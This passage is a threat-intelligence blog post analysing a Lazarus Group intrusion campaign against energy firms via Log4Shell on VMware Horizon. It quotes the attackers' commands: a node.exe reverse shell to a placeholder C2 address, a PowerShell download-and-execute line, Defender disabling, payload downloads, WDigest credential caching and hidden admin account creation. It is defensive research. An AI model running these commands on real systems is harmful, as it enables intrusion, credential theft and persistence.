                                <path class="sticoncomment" d="M13.6,7.1H6.4c-0.3,0-0.6-0.3-0.6-0.6c0-0.3,0.3-0.6,0.6-0.6l7.2,0c0.3,0,0.6,0.3,0.6,0.6  C14.2,6.8,13.9,7.1,13.6,7.1L13.6,7.1z M13.6,9.4H6.4c-0.3,0-0.6-0.3-0.6-0.6s0.3-0.6,0.6-0.6l7.2,0c0.3,0,0.6,0.3,0.6,0.6  C14.2,9.2,13.9,9.4,13.6,9.4L13.6,9.4z M11.5,11.7H6.4c-0.3,0-0.6-0.3-0.6-0.6c0-0.3,0.3-0.6,0.6-0.6h5.1c0.3,0,0.6,0.3,0.6,0.6  C12.1,11.5,11.8,11.7,11.5,11.7z M15.8,3H4.2C3.5,3,3,3.5,3,4.2V17l2.8-2.3h10c0.6,0,1.2-0.5,1.2-1.2V4.2C17,3.5,16.5,3,15.8,3  L15.8,3z"></path>
                                </svg>
                            </div>
                            <span class="top-nav-link-text top-nav-more-text">
                            Media
                            </span>
                        </span>
                    </div>
                    <input class="sub-nav-trigger" id="media-sub-trigger" type="checkbox">
                    <label class="sub-nav-trigger-label" for="media-sub-trigger">
                        <div class="mobile-nav-icon">
                            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="48.167px" height="47.75px" viewBox="0 0 48.167 47.75">
                            <circle opacity="0.4" fill="none" stroke="#FFFFFF" stroke-miterlimit="10" cx="24.083" cy="23.875" r="22"></circle>
                            <g>
                                <circle fill="#FFFFFF" cx="24.083" cy="16.068" r="2.496"></circle>
                                <circle fill="#FFFFFF" cx="24.083" cy="23.875" r="2.496"></circle>
                                <circle fill="#FFFFFF" cx="24.083" cy="31.682" r="2.496"></circle>
                            </g>
                            </svg>
                        </div>
                    </label>
                    <div class="sub-nav sub-nav-multiple-list sub-nav-multiple-list-middle">
                        <div class="sub-nav-multiple-wrapper">
                            <div class="sub-nav-list-top-of-mobile-wrapper">
                                <h1 class="sub-nav-list-header sub-nav-list-top-of-mobile">Media</h1>
                                <ul class="sub-nav-list">
                                    <li class="desktop-hide">
                                        <label class="subnav-back-button" for="media-sub-trigger">BACK</label>
                                    </li>
                                </ul>
                            </div>
                            <div class="sub-nav-list-item-wrapper">
                                <span class="sub-nav-desktop-header uppercase">Media</span>
                                <ul class="sub-nav-list">
                                    <li>
                                        <a href="https://blog.talosintelligence.com"><span>Talos Intelligence Blog</span>
                                        </a></li>
                                    <li>
                                        <a href="https://blog.talosintelligence.com/category/threat-source-newsletter/"><span>Threat Source Newsletter</span>
                                        </a></li>
                                    <li>
                                        <a href="https://talosintelligence.com/podcasts/shows/beers_with_talos"><span>Beers with Talos Podcast</span>
                                        </a></li>
                                    <li>
                                        <a href="https://talosintelligence.com/podcasts/shows/talos_takes"><span>Talos Takes Podcast</span>
                                        </a></li>
                                    <li>
                                        <a target="_blank" href="https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured"><span>Talos Videos</span>
                                        </a></li>
                                </ul>
                            </div>
                        </div>
                    </div>
                    <div class="desktop-hide subnav-overlay"><!-- Generator: Adobe Illustrator 24.2.1, SVG Export Plug-In . SVG Version: 6.00 Build 0)  --><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 20 20" width="25px" height="25px" style="enable-background:new 0 0 20 20;" xml:space="preserve">
                        <style type="text/css">
                            .sticoncomment{fill-rule:evenodd;clip-rule:evenodd;fill:#FFFFFF;}
                        </style>
                        <path class="sticoncomment" d="M13.6,7.1H6.4c-0.3,0-0.6-0.3-0.6-0.6c0-0.3,0.3-0.6,0.6-0.6l7.2,0c0.3,0,0.6,0.3,0.6,0.6  C14.2,6.8,13.9,7.1,13.6,7.1L13.6,7.1z M13.6,9.4H6.4c-0.3,0-0.6-0.3-0.6-0.6s0.3-0.6,0.6-0.6l7.2,0c0.3,0,0.6,0.3,0.6,0.6  C14.2,9.2,13.9,9.4,13.6,9.4L13.6,9.4z M11.5,11.7H6.4c-0.3,0-0.6-0.3-0.6-0.6c0-0.3,0.3-0.6,0.6-0.6h5.1c0.3,0,0.6,0.3,0.6,0.6  C12.1,11.5,11.8,11.7,11.5,11.7z M15.8,3H4.2C3.5,3,3,3.5,3,4.2V17l2.8-2.3h10c0.6,0,1.2-0.5,1.2-1.2V4.2C17,3.5,16.5,3,15.8,3  L15.8,3z"></path>
                        </svg>
                    </div>
                </li>
                <li class="nav-item">
                    <div class="more-link-wrapper more-link-wrapper-mobile">
                        <span class="more-nav-link">
                            <div class="mobile-nav-icon">
                                <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="25px" height="25px" viewBox="0 0 55 55">
                                <g>
                                    <g class="mobile-nav-home">
                                        <path fill-rule="evenodd" clip-rule="evenodd" fill="#FFFFFF" d="M45.201,12.343c0.378,0.48,0.758,0.925,1.096,1.401    c2.975,4.207,4.543,8.876,4.494,14.044c-0.05,5.452-1.643,10.386-5.186,14.593c-3.484,4.133-7.929,6.73-13.182,7.895    c-6.313,1.398-12.216,0.275-17.695-3.131c-0.441-0.273-0.847-0.6-1.266-0.904c-0.11-0.078-0.208-0.174-0.337-0.287    c0.127-0.141,0.246-0.27,0.366-0.398c0.887-0.949,1.765-1.904,2.663-2.844c0.114-0.119,0.321-0.217,0.485-0.217    c3.658-0.006,7.318,0,10.975,0.008c3.458,0.006,6.913,0.02,10.369,0.02c0.957,0,1.871-0.193,2.62-0.844    c0.797-0.693,1.157-1.596,1.157-2.643c0.001-7.533,0.003-15.067-0.005-22.601c-0.002-0.309,0.088-0.524,0.3-0.743    C43.098,14.598,44.127,13.49,45.201,12.343"></path>
                                        <path fill-rule="evenodd" clip-rule="evenodd" fill="#FFFFFF" d="M41.402,8.822c-0.99,1.027-1.994,2.021-2.935,3.072    c-0.312,0.35-0.616,0.416-1.036,0.415c-6.98-0.009-13.957-0.007-20.938-0.007c-2.039,0-3.561,1.514-3.561,3.557    c0,6.504,0.002,13.008,0.006,19.512c0.002,0.973,0.011,1.943,0.004,2.914c0,0.133-0.04,0.301-0.127,0.393    c-1.069,1.162-2.15,2.314-3.229,3.469c-0.021,0.023-0.052,0.039-0.109,0.08c-0.159-0.188-0.323-0.369-0.471-0.562    c-2.535-3.348-4.119-7.102-4.605-11.268c-0.61-5.229,0.194-10.229,2.835-14.839c2.669-4.664,6.655-7.805,11.618-9.75    c3.205-1.257,6.533-1.852,9.977-1.621c4.478,0.298,8.553,1.754,12.227,4.325c0.101,0.072,0.197,0.151,0.291,0.229    C41.364,8.755,41.374,8.778,41.402,8.822"></path>
                                        <path fill-rule="evenodd" clip-rule="evenodd" fill="#FFFFFF" d="M39.799,12.47c0.873-0.911,1.749-1.829,2.676-2.797    c0.605,0.564,1.195,1.112,1.816,1.691c-0.941,0.985-1.817,1.903-2.703,2.83c-0.276-0.339-0.511-0.688-0.807-0.975    C40.492,12.941,40.145,12.728,39.799,12.47"></path>
                                        <path fill-rule="evenodd" clip-rule="evenodd" fill="#FFFFFF" d="M10.35,43.279c0.969-1.016,1.885-1.977,2.76-2.893    c0.213,0.369,0.376,0.762,0.639,1.072c0.265,0.312,0.627,0.539,0.98,0.832c-0.853,0.891-1.713,1.791-2.624,2.746    C11.513,44.445,10.939,43.869,10.35,43.279"></path>
                                    </g>
                                </g>
                                </svg>
                            </div>
                            <span class="top-nav-link-text top-nav-more-text">
                            Company
                            </span>
                        </span>
                    </div>
                    <input class="sub-nav-trigger" id="company-sub-trigger" type="checkbox">
                    <label class="sub-nav-trigger-label" for="company-sub-trigger">
                        <div class="mobile-nav-icon">
                            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="48.167px" height="47.75px" viewBox="0 0 48.167 47.75">
                            <circle opacity="0.4" fill="none" stroke="#FFFFFF" stroke-miterlimit="10" cx="24.083" cy="23.875" r="22"></circle>
                            <g>
                                <circle fill="#FFFFFF" cx="24.083" cy="16.068" r="2.496"></circle>
                                <circle fill="#FFFFFF" cx="24.083" cy="23.875" r="2.496"></circle>
                                <circle fill="#FFFFFF" cx="24.083" cy="31.682" r="2.496"></circle>
                            </g>
                        </svg>
                        </div>
                    </label>
                    <div class="sub-nav sub-nav-multiple-list sub-nav-multiple-list-right">
                        <div class="sub-nav-multiple-wrapper">
                            <div class="sub-nav-list-top-of-mobile-wrapper">
                                <h1 class="sub-nav-list-header sub-nav-list-top-of-mobile">Company</h1>
                                <ul class="sub-nav-list">
                                    <li class="desktop-hide">
                                        <label class="subnav-back-button" for="company-sub-trigger">BACK</label>
                                    </li>
                                </ul>
                            </div>
                            <div class="sub-nav-list-item-wrapper">
                                <span class="sub-nav-desktop-header uppercase">Company</span>
                                <ul class="sub-nav-list">
                                    <li>
                                        <a href="https://talosintelligence.com/about"><span>About Talos</span>
                                        </a></li>
                                    <li>
                                        <a href="https://talosintelligence.com/careers"><span>Careers</span>
                                        </a></li>
                                </ul>
                            </div>
                        </div>
                    </div>
                    <div class="desktop-hide subnav-overlay"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="25px" height="25px" viewBox="0 0 55 55">
                        <g>
                            <g class="mobile-nav-home">
                                <path fill-rule="evenodd" clip-rule="evenodd" fill="#FFFFFF" d="M45.201,12.343c0.378,0.48,0.758,0.925,1.096,1.401    c2.975,4.207,4.543,8.876,4.494,14.044c-0.05,5.452-1.643,10.386-5.186,14.593c-3.484,4.133-7.929,6.73-13.182,7.895    c-6.313,1.398-12.216,0.275-17.695-3.131c-0.441-0.273-0.847-0.6-1.266-0.904c-0.11-0.078-0.208-0.174-0.337-0.287    c0.127-0.141,0.246-0.27,0.366-0.398c0.887-0.949,1.765-1.904,2.663-2.844c0.114-0.119,0.321-0.217,0.485-0.217    c3.658-0.006,7.318,0,10.975,0.008c3.458,0.006,6.913,0.02,10.369,0.02c0.957,0,1.871-0.193,2.62-0.844    c0.797-0.693,1.157-1.596,1.157-2.643c0.001-7.533,0.003-15.067-0.005-22.601c-0.002-0.309,0.088-0.524,0.3-0.743    C43.098,14.598,44.127,13.49,45.201,12.343"></path>
                                <path fill-rule="evenodd" clip-rule="evenodd" fill="#FFFFFF" d="M41.402,8.822c-0.99,1.027-1.994,2.021-2.935,3.072    c-0.312,0.35-0.616,0.416-1.036,0.415c-6.98-0.009-13.957-0.007-20.938-0.007c-2.039,0-3.561,1.514-3.561,3.557    c0,6.504,0.002,13.008,0.006,19.512c0.002,0.973,0.011,1.943,0.004,2.914c0,0.133-0.04,0.301-0.127,0.393    c-1.069,1.162-2.15,2.314-3.229,3.469c-0.021,0.023-0.052,0.039-0.109,0.08c-0.159-0.188-0.323-0.369-0.471-0.562    c-2.535-3.348-4.119-7.102-4.605-11.268c-0.61-5.229,0.194-10.229,2.835-14.839c2.669-4.664,6.655-7.805,11.618-9.75    c3.205-1.257,6.533-1.852,9.977-1.621c4.478,0.298,8.553,1.754,12.227,4.325c0.101,0.072,0.197,0.151,0.291,0.229    C41.364,8.755,41.374,8.778,41.402,8.822"></path>
                                <path fill-rule="evenodd" clip-rule="evenodd" fill="#FFFFFF" d="M39.799,12.47c0.873-0.911,1.749-1.829,2.676-2.797    c0.605,0.564,1.195,1.112,1.816,1.691c-0.941,0.985-1.817,1.903-2.703,2.83c-0.276-0.339-0.511-0.688-0.807-0.975    C40.492,12.941,40.145,12.728,39.799,12.47"></path>
                                <path fill-rule="evenodd" clip-rule="evenodd" fill="#FFFFFF" d="M10.35,43.279c0.969-1.016,1.885-1.977,2.76-2.893    c0.213,0.369,0.376,0.762,0.639,1.072c0.265,0.312,0.627,0.539,0.98,0.832c-0.853,0.891-1.713,1.791-2.624,2.746    C11.513,44.445,10.939,43.869,10.35,43.279"></path>
                            </g>
                        </g>
                    </svg>
                    </div>
                </li>
            </ul>
            <div class="nav-search-wrapper">
                <button class="search-button" data-ghost-search>
                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
                </button>
            </div>
        </div>



    </div>
</nav>

    

    <main id="site-main">

            <div class="banner-content-wrapper">
                <div class="container">
                    <div class="row">
                            <div class="col threat-spotlight-graphic banner-post-graphic"></div>

                    </div>
                </div>
            </div>
                <div class="container-fluid">
                    <div class="row banner-bg-container banner-bg-2">
                        <div class="col left-bg-2"></div>
                        <div class="col right-bg-2"></div>
                    </div>
                </div>

            
        <div class="container-fluid">
            <div class="row main-content-row">
                <div class="col">
                    <div class="post-full-content">
                        
<article class="post tag-threat-spotlight  blog-series-article">

    <h1 class="text-center">Lazarus and the tale of three RATs</h1>

    <div class="text-center m-1">
        <div class="post-author">
            <span>By </span>
                <a href="https://blog.talosintelligence.com/author/asheer-malhotra/">Asheer Malhotra</a>, 
                <a href="https://blog.talosintelligence.com/author/vitor-ventura/">Vitor Ventura</a>, 
                <a href="https://blog.talosintelligence.com/author/jungsoo/">Jungsoo An</a>
        </div>

        <br/>
        <time class="post-datetime" datetime="September 8, 2022 08:01">
            Thursday, September 8, 2022 08:01
        </time>

        <div class="m-3">
                        <a href="https://blog.talosintelligence.com/category/threat-spotlight/" class="category primary-category">
                            Threat Spotlight
                        </a>
                            </div>
    </div>

    <section class="post-content-wrapper mt-5">
        <div class="post-content">
            <figure class="kg-card kg-image-card"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEirSyHz3F1h5ssU4kBQ7JqFTn4DuIdAw_PQvBsu_E6LdCa5c9JJAOCmPOky2GIDE5YwyBvzG1QDkMXiyqqYYlIVHK72DIhEPfsNyEW1n8cSjZPPtOebJ-3mREn6Ytr3sp8DwLS5M2E6c7w4cmjh2cI1PnsHx9eOusJIKgzWsIt1zcbdcLwvS5gbeQQiyg/s16000/image6.jpg" class="kg-image" alt="" loading="lazy" width="2000" height="1000"></figure><ul><li>Cisco Talos has been tracking a new campaign operated by the <a href="https://www.cisa.gov/uscert/northkorea">Lazarus APT</a> group, attributed to North Korea by the United States government.</li><li>This campaign involved the exploitation of vulnerabilities in VMWare Horizon to gain an initial foothold into targeted organizations.</li><li>Targeted organizations include energy providers from around the world, including those headquartered in the United States, Canada and Japan.</li><li>The campaign is meant to infiltrate organizations around the world for establishing long term access and subsequently exfiltrating data of interest to the adversary's nation-state.</li><li>Talos has discovered the use of two known families of malware in these intrusions â€” <a href="https://blogs.jpcert.or.jp/en/2021/03/Lazarus_malware3.html">VSingle</a> and <a href="https://blogs.jpcert.or.jp/en/2022/07/yamabot.html">YamaBot</a>.</li><li>Talos has also discovered the use of a recently disclosed implant we're calling "<a href="https://blog.talosintelligence.com/2022/09/lazarus-magicrat.html">MagicRAT</a>" in this campaign.</li></ul><p><br>Cisco Talos observed North Korean state-sponsored APT Lazarus Group conducting malicious activity between February and July 2022. Lazarus has been previously <a href="https://www.cisa.gov/uscert/northkorea">attributed to the North Korean government</a> by the U.S. Cybersecurity and Infrastructure Security Agency (CISA). The entry vectors involve the successful exploitation of vulnerabilities in VMWare products to establish initial footholds into enterprise networks, followed by the deployment of the group's custom malware implants,<a href="https://blogs.jpcert.or.jp/en/2021/03/Lazarus_malware3.html">VSingle</a> and <a href="https://blogs.jpcert.or.jp/en/2022/07/yamabot.html">YamaBot</a>. In addition to these known malware families, we have also discovered the use of a previously unknown malware implant we're calling "MagicRAT."<br><br>This campaign was previously partially disclosed by <a href="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/stonefly-north-korea-espionage">other</a> security <a href="https://asec.ahnlab.com/ko/34107/">firms</a>, but our findings reveal more details about the adversary's modus operandi. We have also observed an overlap of command and control (C2) and payload-hosting infrastructure between our findings and the U.S. Cybersecurity and Infrastructure Security Agency's (<a href="https://www.cisa.gov/uscert/ncas/alerts/aa22-174a">CISA) June advisory</a> that detailed continued attempts from threat actors to compromise vulnerable VMWare Horizon servers.<br><br>In this research, we illustrate Lazarus Group's post-exploitation tactics, techniques and procedures (TTPs) to establish a foothold, perform initial reconnaissance, deploy bespoke malware and move laterally across infected enterprises. We also provide details about the activities performed by the attackers when the VSingle backdoor is instrumented on the infected endpoints.<br><br>In this campaign, Lazarus was primarily targeting energy companies in Canada, the U.S. and Japan. The main goal of these attacks was likely to establish long-term access into victim networks to conduct espionage operations in support of North Korean government objectives. This activity aligns with historical Lazarus intrusions targeting <a href="https://www.mcafee.com/blogs/other-blogs/mcafee-labs/operation-sharpshooter-targets-global-defense-critical-infrastructure/">critical infrastructure</a> and energy companies to establish long-term access to siphon off proprietary intellectual property.</p><figure class="kg-card kg-image-card"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgwnopTG4ct6GsJf_2lkidIxa6O0qVVGyNNZaAly2XcC6cieQhkEFzX3duqxvmnMd3CAnMMVwa_NG77redfN9oe0Z40ID7Z1zaJyn82lZUFK8omGiVzHtpKg4naFz0ydiyNVhpE81B_wj19jPlGTOQT-qX3-LDUTOhAyFdmakZ8I5cKO3bzvxKEEQ5Ang/s16000/image8.jpg" class="kg-image" alt="" loading="lazy" width="1999" height="1172"></figure><h3 id="attribution">Attribution</h3><p><br>Cisco Talos assesses with high confidence these attacks have been conducted by the North Korean state-sponsored threat actor Lazarus Group. During our investigations, we identified three distinct RATs being employed by the threat actors, including VSingle and YamaBot, which are exclusively developed and distributed by Lazarus. The Japanese CERT (JPCERT/CC) recently published reports (<a href="https://blogs.jpcert.or.jp/en/2021/03/Lazarus_malware3.html">VSingle</a>,<a href="https://blogs.jpcert.or.jp/en/2022/07/yamabot.html">YamaBot</a>), describing them in detail and attributed the campaigns to the Lazarus threat actor.<br><br>The TTPs used in these attacks also point to the Lazarus threat actor. The initial vector was the exploitation of the <a href="https://blog.talosintelligence.com/2021/12/apache-log4j-rce-vulnerability.html">Log4j</a> vulnerability on exposed VMware Horizon servers. Successful post-exploitation led to the download of their toolkit from web servers. The same initial vector, URL patterns and similar subsequent hands-on-keyboard activity have been described in this <a href="https://asec.ahnlab.com/ko/34107/">report</a> from AhnLab from earlier this year. There are also overlapping IOCs between the campaign described by AhnLab and the current campaign, such as the IP address84[.]38.133[.]145, which was used as a hosting platform for the actors' malicious tools. Although the same tactics have been applied in both attacks, the resulting malware implants deployed have been distinct from one another, indicating the wide variety of implants available at the disposal of Lazarus. Additionally, we've also observed similarities in TTPs disclosed by <a href="https://securelist.com/andariel-deploys-dtrack-and-maui-ransomware/107063/">Kaspersky</a> attributed to the Andariel sub-group under the Lazarus umbrella, with the critical difference being the deployment of distinct malware. While Kaspersky discovered the use of Dtrack and Maui, we've observed the use of VSingle, YamaBot and <a href="https://blog.talosintelligence.com/2022/09/lazarus-magicrat.html">MagicRAT</a>.<br><br>Cisco Talos acknowledges that when analyzed individually, the attribution evidence only reaches medium-confidence, however, we're raising our confidence level when analyzing all these points in the context of the campaign and victims.<br><br><br></p><h2 id="campaign">Campaign</h2><p><br>Cisco Talos has observed several attacks targeting multiple victims. In this section, we detail two specific attack instances that we assess have been the most representative of the playbooks employed by Lazarus in this campaign:<br><br></p><ul><li>Victim 1: Illustrates the kill chain from exploitation to actions on objectives. This intrusion also illustrates the use of the VSingle implant.</li><li>Victim 2: Represents a kill chain similar to Victim 1 but in this instance, we observed the deployment of a new implant we're calling "<a href="https://blog.talosintelligence.com/2022/09/lazarus-magicrat.html">MagicRAT</a>" along with VSingle.</li></ul><p><br><br>A third intrusion set worth noting here is one where we saw the use of a third bespoke implant known as YamaBot. YamaBot was recently <a href="https://blogs.jpcert.or.jp/en/2022/07/yamabot.html">disclosed and attributed</a> to the Lazarus APT by the Japan Computer Emergency Response Team Coordination Center (<a href="https://www.jpcert.or.jp/english/">JPCERT/CC</a>).<br><br></p><figure class="kg-card kg-image-card"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhpxQcvn0qO_w6kPukPIxq-40h2G_RbrFMyKLnTk4k6kgYTxnI1orwAkKHMY_s3pGQKUPtm4s4BEj5UIjDjk_le5HOCFHuW1QryLBpqDi7i0VW1zX0adyYswBlCkaZLOG5Zzn8EZUW3Z_8KkWCOBXxVwSsWMo6GVfKJuqYlKpaietwLv04MGTP05R5gpA/s16000/image7.jpg" class="kg-image" alt="" loading="lazy" width="1611" height="1999"></figure><p><br><br><br><br></p><h3 id="victim-no-1-vsingle-and-beyond">Victim No. 1: VSingle and beyond</h3><p><br>In the case of the first victim, we observed the exploitation of publicly known vulnerabilities to ultimately deploy the VSingle backdoor on infected endpoints to establish long-term access.<br><br>In this specific instance, we also observed the actual instrumentation of VSingle implants to carry out additional malicious activities on the infected systems. The flow below provides an overview of the attacker's playbook, which will be detailed in the sections ahead.<br><br></p><figure class="kg-card kg-image-card"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhUvA9-KSsXP7RzFsjuCRdKESY-yt3S9aufKTbXlq4nwdsrcrrDgpiAxTeSu-6qaIvOjwfXOIowHPRp0yEsE2qiHcOtJD9YGQF99ZvLC9LzXOd7WuNhKuBORvblr2fJ5Hrl0mze23Fxan8lw0l8lNPjQFLi4VFQv96wFiEmqzcM8F05ZxY2hiytfqXl-w/s16000/image3.jpg" class="kg-image" alt="" loading="lazy" width="1999" height="1991"></figure><p><br><br><br><br></p><h4 id="exploitation-and-foothold">Exploitation and foothold</h4><p><br>Cisco Talos identified the exploitation of the <a href="https://blog.talosintelligence.com/2021/12/apache-log4j-rce-vulnerability.html">Log4Shell vulnerability</a> on VmWare Horizon public-facing servers as the initial attack vector [<a href="https://attack.mitre.org/versions/v11/techniques/T1190/">T1190</a>]. The compromise is followed by a series of activities to establish a foothold [<a href="https://attack.mitre.org/versions/v11/tactics/TA0001/">TA0001</a>] on the systems before the attackers deploy additional malware and move laterally across the network. During our investigation, we discovered two different foothold payloads. In the first, the attackers abusenode.exe, which is shipped with VMware to execute the onelinernode.exescript below.<br><br> C:"Program Files"\VMware"VMware View"\Server\appblastgateway\node.exe -r net -e "sh = require('child_process').exec('<strong>cmd.exe</strong>');var client = new net.Socket();client.connect(&lt;Port&gt;, '&lt;C2_IP&gt;', function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});" <br>This essentially opens an interactive reverse shell that attackers could use to issue arbitrary commands on the infected entry endpoint.<br><br>In another instance, we observed the attackers exploiting vulnerabilities in VMWare to launch custom PowerShell scripts on the infected endpoint via VMWare'sws_ConnectionServer.exe:<br><br>powershell -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://&lt;remote_location&gt;/&lt;filename&gt;.ps1') <br>Since VMWare Horizon is executed with administrator privileges, the attacker doesn't have to worry about elevating their privileges.<br><br>After the interactive shell is established, the attackers perform a preliminary reconnaissance on the endpoint to get network information and directory listings [<a href="https://attack.mitre.org/techniques/T1083/">T1083</a>], [<a href="https://attack.mitre.org/techniques/T1590/">T1590</a>], [<a href="https://attack.mitre.org/techniques/T1518/">T1518</a>]:<br><br></p>
<!--kg-card-begin: html-->
<table class="threats-table"><tbody><tr><td class="threat-name-col">ipconfig /all</td></tr><tr><td class="threat-name-col">dir c:"Program Files (x86)</td></tr><tr><td class="threat-name-col">dir c:"Program Files</td></tr></tbody></table>
<!--kg-card-end: html-->
<p><br><br>The next step is the deactivation of the Windows Defender components [<a href="https://attack.mitre.org/techniques/T1562/">T1562</a>]. This is done through registry key changes, WMIC commands and PowerShell commands. The list below contains the full list of methods Cisco Talos observed.<br><br></p>
<!--kg-card-begin: html-->
<table class="threats-table"><tbody><tr><td class="threat-name-col">powershell -exec bypass -Command Get-MpPreference</td></tr><tr><td class="threat-name-col">powershell.exe -ExecutionPolicy Bypass -command Set-MpPreference -DisableRealtimeMonitoring $true</td></tr><tr><td class="threat-name-col">reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection /s /f DisableRealtimeMonitoring</td></tr></tbody></table>
<!--kg-card-end: html-->
<p><br><br>Once the AV on the system has been bypassed using the reverse shell, the attackers then deploy the actual malware implant from a malware family known to be developed and operated by Lazarus called "VSingle."<br><br>The deployment consists of downloading a copy of the legitimate WinRAR utility from a remote location controlled by the attackers along with an additional payload (archive) [<a href="https://attack.mitre.org/techniques/T1608/001/">T1608</a>]:<br><br></p>
<!--kg-card-begin: html-->
<table class="threats-table"><tbody><tr><td class="threat-name-col">powershell -exec bypass -command (New-Object System.Net.WebClient).DownloadFile('&lt;remote_location&gt;\\rar.tmp', '&lt;local_path&gt;\\rar.exe')</td></tr><tr><td class="threat-name-col">powershell -exec bypass -command (New-Object System.Net.WebClient).DownloadFile('&lt;remote_location&gt;\\update.tmp &lt;local_path&gt;\\java.tmp')</td></tr><tr><td class="threat-name-col">&lt;local_path&gt;\\rar.exe e &lt;local_path&gt;\\java.tmp &lt;local_path_2&gt; -hp!no!</td></tr></tbody></table>
<!--kg-card-end: html-->
<p><br><br>The archive downloaded to the infected endpoint is decompressed and consists of the VSingle malware executable which is optionally renamed and then persisted on the endpoint by creating an auto-start service.<br><br><br></p><h4 id="how-is-vsingle-used">How is VSingle used?</h4><p><br>Our investigations led to the discovery of commands fed to the VSingle backdoor by the attackers to carry out a variety of activities such as reconnaissance, exfiltration and manual backdooring.<br><br>The actor starts by performing additional reconnaissance tasks by running the commands below [<a href="https://attack.mitre.org/techniques/T1083/">T1083</a>], [<a href="https://attack.mitre.org/techniques/T1590/">T1590</a>].<br><br></p>
<!--kg-card-begin: html-->
<table class="threats-table"><thead><tr><th width="400px">Command</th><th width="200px">Intent</th></tr></thead><tbody><tr><td class="threat-name-col">systeminfo &amp; ipconfig /all &amp; netstat -naop tcp &amp; tasklist &amp; net user &amp; net view &amp; arp -a</td><td>System Information Discovery [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1082/&quot;}" href="https://attack.mitre.org/techniques/T1082/">T1082</a>]</td></tr><tr><td class="threat-name-col">query user</td><td>System Information Discovery [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1082/&quot;}" href="https://attack.mitre.org/techniques/T1082/">T1082</a>]</td></tr><tr><td class="threat-name-col">whoami</td><td>System Information Discovery [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1082/&quot;}" href="https://attack.mitre.org/techniques/T1082/">T1082</a>]</td></tr><tr><td class="threat-name-col">dir /a %appdata%\microsoft</td><td>System Information Discovery [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1082/&quot;}" href="https://attack.mitre.org/techniques/T1082/">T1082</a>]</td></tr><tr><td class="threat-name-col">dir /a C:\Windows\system32\config\systemprofile\AppData\Roaming\microsoft<br>cmd.exe /u /c dir /a c:\users\administrator</td><td>System Information Discovery [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1082/&quot;}" href="https://attack.mitre.org/techniques/T1082/">T1082</a>]</td></tr><tr><td class="threat-name-col">cmd /C pwd<br>cmd /C dir<br>cmd /C cd c:\\Users\\&lt;username&gt;\Download &amp; dir<br>cmd /C cd c:\\Users\\&lt;username&gt;\Downloads &amp; dir<br>cmd /C cd c:\\Users\\&lt;username&gt; &amp; dir<br>cmd /C cd c: &amp; dir<br>cmd /C tree c:\\Users</td><td>System Information Discovery [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1082/&quot;}" href="https://attack.mitre.org/techniques/T1082/">T1082</a>]</td></tr><tr><td class="threat-name-col">cmd.exe /u /c time /t<br>cmd.exe /u /c query session</td><td>System Information Discovery [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1082/&quot;}" href="https://attack.mitre.org/techniques/T1082/">T1082</a>]</td></tr></tbody></table>
<!--kg-card-end: html-->
<p><br><br>These commands will give the operators a solid understanding of the system they are in, including the installed software, network configuration and system users, among other things. This kind of information is crucial to preparing for lateral movement activities.<br><br>The attackers also force the system to cache credentials so that it is possible to harvest them afterward [<a href="https://attack.mitre.org/techniques/T1003/005/">T1003/005</a>].<br><br>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f <br><br>The other configuration changes made to the victim host are intended to provide the attackers with their own admin-level users [<a href="https://attack.mitre.org/techniques/T1136/002/">T1136</a>].<br><br></p>
<!--kg-card-begin: html-->
<table class="threats-table"><thead><tr><th width="400px">Command</th><th width="200px">Intent</th></tr></thead><tbody><tr><td class="threat-name-col">cmd.exe /u /c net user &lt;userid&gt; &lt;password&gt; /add</td><td>Create user</td></tr><tr><td class="threat-name-col">cmd.exe /u /c reg add HKLM\software\microsoft\windows nt\currentversion\winlogon\specialaccounts\userlist /v &lt;username&gt; /t REG_DWORD /d 0 /f</td><td>Add privileges</td></tr><tr><td class="threat-name-col">cmd.exe /u /c net localgroup Administrators /add &lt;username&gt;<br>cmd.exe /u /c net localgroup Remote Desktop Users /add &lt;username&gt;</td><td>Add privileges</td></tr><tr><td class="threat-name-col">cmd.exe /u /c net localgroup Administrateur /add &lt;username&gt;<br>cmd.exe /u /c net localgroup Administrateurs /add &lt;username&gt;</td><td>Add privileges</td></tr><tr><td class="threat-name-col">cmd.exe /u /c reg add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v AllowMultipleTSSessions /t REG_DWORD /d 1 /f</td><td>System config - Allow multiple sessions</td></tr><tr><td class="threat-name-col">cmd.exe /u /c reg add 